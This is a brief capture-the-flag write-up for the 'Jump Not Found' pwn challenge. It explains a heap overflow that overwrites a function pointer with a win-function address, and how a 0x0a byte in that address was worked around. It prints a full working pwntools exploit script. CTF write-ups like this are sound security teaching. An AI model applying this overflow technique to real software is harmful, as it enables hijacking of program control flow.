# Jump Not Found 400pts (25 solves) #

![TASK](https://imgur.com/epSLtgQ.png)

This was a heap based overflow , we will overflow the jumpToHoth function address with jumpToNaboo (Win) function address, i faced a little problem because gets stops when it encounters an "\n" (0x0a) and the WIN function address has 0x0a so i have chosen an address in the WIN function (not the start of the function).

Here is my full exploit , if you are interested i will post a detailed writeup about this challenge and WPICTF pwn challenges in the next days, so stay tuned (My twitter account @BelkahlaAhmed1)

```python

from pwn import *

p=process("./JNF")
#p=remote("192.241.138.174",9996)
p.recvuntil("CONSOLE>")
WIN=p64(0x000000000040070e)
OFFSET="1"+"A"*79
payload=OFFSET
payload+=WIN
p.sendline(payload)
log.info("Found Flag ! ")
p.interactive()

```

**Note:** Binary link [HERE](https://github.com/kahla-sec/CTF-Writeups/blob/master/UMDCTF%202020/Jump%20Not%20Found/JNF)
If you have any questions you can DM on twitter @BelkahlaAhmed1 , thank you :D
